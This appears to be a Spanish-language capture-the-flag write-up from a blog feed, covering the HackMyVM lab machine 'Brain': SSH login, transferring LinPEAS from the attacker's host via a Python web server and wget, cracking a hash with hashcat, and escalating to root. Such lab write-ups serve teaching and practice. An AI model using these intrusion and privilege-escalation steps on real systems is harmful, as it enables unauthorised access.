+&lt;p&gt;Con el siguiente comando vamos a intentar conectarnos por ssh con las credenciales:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ &lt;span class=&quot;c&quot;&gt;#ssh salomon@192.163.0.53&lt;/span&gt;
+salomon@192.163.0.53&lt;span class=&quot;s1&quot;&gt;'s password: 
+Linux Brain 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+
+BBBBBBBBBBBBBBBBB      RRRRRRRRRRRRRRRRR                     AAA                  IIIIIIIIII   NNNNNNNN        NNNNNNNN
+B::::::::::::::::B     R::::::::::::::::R                   A:::A                 I::::::::I   N:::::::N       N::::::N
+B::::::BBBBBB:::::B    R::::::RRRRRR:::::R                 A:::::A                I::::::::I   N::::::::N      N::::::N
+BB:::::B     B:::::B   RR:::::R     R:::::R               A:::::::A               II::::::II   N:::::::::N     N::::::N
+  B::::B     B:::::B     R::::R     R:::::R              A:::::::::A                I::::I     N::::::::::N    N::::::N
+  B::::B     B:::::B     R::::R     R:::::R             A:::::A:::::A               I::::I     N:::::::::::N   N::::::N
+  B::::BBBBBB:::::B      R::::RRRRRR:::::R             A:::::A A:::::A              I::::I     N:::::::N::::N  N::::::N
+  B:::::::::::::BB       R:::::::::::::RR             A:::::A   A:::::A             I::::I     N::::::N N::::N N::::::N
+  B::::BBBBBB:::::B      R::::RRRRRR:::::R           A:::::A     A:::::A            I::::I     N::::::N  N::::N:::::::N
+  B::::B     B:::::B     R::::R     R:::::R         A:::::AAAAAAAAA:::::A           I::::I     N::::::N   N:::::::::::N
+  B::::B     B:::::B     R::::R     R:::::R        A:::::::::::::::::::::A          I::::I     N::::::N    N::::::::::N
+  B::::B     B:::::B     R::::R     R:::::R       A:::::AAAAAAAAAAAAA:::::A         I::::I     N::::::N     N:::::::::N
+BB:::::BBBBBB::::::B   RR:::::R     R:::::R      A:::::A             A:::::A      II::::::II   N::::::N      N::::::::N
+B:::::::::::::::::B    R::::::R     R:::::R     A:::::A               A:::::A     I::::::::I   N::::::N       N:::::::N
+B::::::::::::::::B     R::::::R     R:::::R    A:::::A                 A:::::A    I::::::::I   N::::::N        N::::::N
+BBBBBBBBBBBBBBBBB      RRRRRRRR     RRRRRRR   AAAAAAA                   AAAAAAA   IIIIIIIIII   NNNNNNNN         NNNNNNN
+
+
+salomon@Brain:~$ ls
+user.txt
+salomon@Brain:~$ cat user.txt;echo
+onXXXXXvDtAR7wZu3I8HKXXXX
+
+salomon@Brain:~$
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Bingo! Hemos ganado el acceso a la máquina y tenemos la flag del usuario&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegio&quot;&gt;Escalada de Privilegio&lt;/h2&gt;
+
+&lt;p&gt;En este punto ya tenemos acceso a la máquina pero aún no somos el usuario con altos privilegios (root), para que sea más fácil la escalada de privilegios vamos a usar &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS&quot;&gt;LinPEAS&lt;/a&gt;. LinPEAS es una herramienta que nos ayuda en esta fase.&lt;/p&gt;
+
+&lt;p&gt;Primero hay que transeferirse linpeas.sh a la máquina víctima:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nuestra máquina:&lt;/span&gt;
+┌─[root@rijaba1-pc]─[~/Desktop/Brain/exploits]
+└──╼ &lt;span class=&quot;c&quot;&gt;#wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh&lt;/span&gt;
+
+&lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;
+
+linpeas.sh                                      100%[&lt;span class=&quot;o&quot;&gt;====================================================================================================&amp;gt;]&lt;/span&gt; 744,96K  2,31MB/s    en 0,3s    
+
+2022-01-02 16:16:52 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2,31 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - «linpeas.sh» guardado &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;762836/762836]
+
+┌─[root@rijaba1-pc]─[~/Desktop/Brain/exploits]
+└──╼ &lt;span class=&quot;c&quot;&gt;#python3 -m http.server 8080&lt;/span&gt;
+Serving HTTP on 0.0.0.0 port 8080 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:8080/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+
+&lt;span class=&quot;c&quot;&gt;# Máquina Victima:&lt;/span&gt;
+salomon@Brain:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/
+salomon@Brain:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget http://192.163.0.8:8080/linpeas.sh
+&lt;span class=&quot;nt&quot;&gt;--2022-01-02&lt;/span&gt; 16:17:15--  http://192.163.0.8:8080/linpeas.sh
+Conectando con 192.163.0.8:8080... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 762836 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;745K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/x-sh]
+Grabando a: “linpeas.sh”
+
+linpeas.sh.1                                    100%[&lt;span class=&quot;o&quot;&gt;====================================================================================================&amp;gt;]&lt;/span&gt; 744,96K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    en 0,004s  
+
+2022-01-02 16:17:15 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;172 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - “linpeas.sh” guardado &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;762836/762836]
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Una vez hecho esto detenemos el servidor http montando en python y ejecutamos la herramienta:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;salomon@Brain:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x linpeas.sh
+salomon@Brain:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./linpeas.sh 
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Entre todo lo que hace la herramienta me sorprende la parte donde nos muestr todos los procesos que se están ejecutando:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╔══════════╣ Cleaned processes                                                                                                                                                      &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;549/727]
+╚ Check weird &amp;amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                       
+&lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;
+root       370  0.0  0.0   5260   684 ?        S    13:45   0:00              _ &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;999999999999999                                                                                        
+root       312  0.0  0.3 225824  3536 ?        Ssl  13:45   0:00 /usr/sbin/rsyslogd &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iNONE&lt;/span&gt;                                                                                                
+root       346  0.0  0.5   9488  5732 ?        Ss   13:45   0:00 /sbin/dhclient &lt;span class=&quot;nt&quot;&gt;-4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-pf&lt;/span&gt; /run/dhclient.enp0s3.pid &lt;span class=&quot;nt&quot;&gt;-lf&lt;/span&gt; /var/lib/dhcp/dhclient.enp0s3.leases &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-df&lt;/span&gt; /var/lib/dhcp/dhclient6
+.enp0s3.leases enp0s3                                                                                                                                                                        
+root       369  0.0  1.3  22224 13360 ?        S    13:45   0:00 python /root/server.py 127.0.0.1:65000                                                                                      
+root       394  0.0  0.1   5612  1544 tty1     Ss+  13:45   0:00 /sbin/agetty &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; u &lt;span class=&quot;nt&quot;&gt;--noclear&lt;/span&gt; tty1 linux                                                                                
+root       400  0.0  0.6  15852  6984 ?        Ss   13:45   0:00 /usr/sbin/sshd &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt;                                                                                                           
+&lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Podemos ver que el usuario root está ejecutando un servidor con Python. Vamos a hacerle una petición GET al servidor:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;salomon@Brain:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget 127.0.0.1:65000
+&lt;span class=&quot;nt&quot;&gt;--2022-01-02&lt;/span&gt; 16:23:08--  http://127.0.0.1:65000/
+Conectando con 127.0.0.1:65000... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 192 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/html]
+Grabando a: “index.html”
+
+index.html                                      100%[&lt;span class=&quot;o&quot;&gt;====================================================================================================&amp;gt;]&lt;/span&gt;     192  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    en 0s      
+
+2022-01-02 16:23:08 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;88,9 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - “index.html” guardado &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192/192]
+
+salomon@Brain:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;index.html  systemd-private-d91299c48ef040feaec25068ed159d30-apache2.service-EZFh1S  systemd-private-d91299c48ef040feaec25068ed159d30-systemd-timesyncd.service-AoQJpy
+salomon@Brain:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;index.html 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] You are a great Hacker!! I think you are looking &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this:
+065BB0B9A0C654E5B3B6XXXXXXXXXXXXXXXXXXXX09D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6XXXXXXXXXXXXXXX1D742251F5A17167
+salomon@Brain:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Parece que hemos encontrado un hash, vamos a crackearlo en local&lt;/p&gt;
+
+&lt;h3 id=&quot;crack-del-hash&quot;&gt;Crack del Hash&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ &lt;span class=&quot;c&quot;&gt;#echo '065BB0B9A0C654E5B3B6XXXXXXXXXXXXXXXXXXXX09D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6XXXXXXXXXXXXXXX1D742251F5A17167' &amp;gt; hash&lt;/span&gt;
+┌─[root@rijaba1-pc]─[~/Desktop/Brain]
+└──╼ &lt;span class=&quot;c&quot;&gt;#hashcat -O -a0 -m1700 hash /usr/share/wordlists/rockyou.txt&lt;/span&gt;
+hashcat &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;v6.1.1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting...                                                                                                                                                                 
+                                                                                                                                                                                             
+OpenCL API &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Platform &lt;span class=&quot;c&quot;&gt;#1 [The pocl project]                                                                &lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;=============================================================================================================================&lt;/span&gt;                                                                
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Device &lt;span class=&quot;c&quot;&gt;#1: *********                                                                                       &lt;/span&gt;
+                                                                                                                                                                                             
+
+&lt;span class=&quot;nt&quot;&gt;-------------------------------------------------------------------&lt;/span&gt;
+                                                                                                                                                                                             
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this attack: 65 MB
+
+Dictionary cache built:
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Filename..: /usr/share/wordlists/rockyou.txt
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Passwords.: 14344391
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Bytes.....: 139921497
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Keyspace..: 14344384
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Runtime...: 1 sec
+
+065BB0B9A0C654E5B3B6XXXXXXXXXXXXXXXXXXXX09D941989EC4D728FBE3290E47D2058839215BBE6144F51E7FCE8A8C6XXXXXXXXXXXXXXX1D742251F5A17167:&lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hemos decifrado el hash! Ahora vamos a convertirnos en root proporcionando la contraseña decifrada.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;salomon@Brain:/tmp&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su root
+Contraseña: 
+root@Brain:/tmp# &lt;span class=&quot;nb&quot;&gt;cd
+&lt;/span&gt;root@Brain:~# &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;index.html  root.txt  run_server.sh  server.py
+root@Brain:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo
+&lt;/span&gt;gmC9GR0EMUXXXXXXXXXXXXXXX
+
+root@Brain:~# 
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;¡Ya somos root, eso inplica que ya tenemos su flag!&lt;/p&gt;</content><author><name>RiJaba1</name></author><category term="Writeup" /><category term="Writeup" /><category term="Hacking" /><category term="HackMyVM" /><summary type="html">En este artículo os enseño a como vulnerar la máquina Brain de HackMyVM</summary></entry><entry><title type="html">Herramienta portDiscoverSH</title><link href="http://localhost:4000/herramienta-portDiscoverSH/" rel="alternate" type="text/html" title="Herramienta portDiscoverSH" /><published>2021-12-19T00:00:00+01:00</published><updated>2021-12-19T00:00:00+01:00</updated><id>http://localhost:4000/herramienta-portDiscoverSH</id><content type="html" xml:base="http://localhost:4000/herramienta-portDiscoverSH/">&lt;h2 id=&quot;utilidad&quot;&gt;Utilidad&lt;/h2&gt;
 &lt;p&gt;Esta herramienta está diseñada para poder hacer un escaneo rápido y poco ruidoso a una IP que nosotros le asignemos.&lt;/p&gt;
 
 &lt;p&gt;El enlace a GitHub para descargar esta utilidad lo teneis más abajo.&lt;/p&gt;
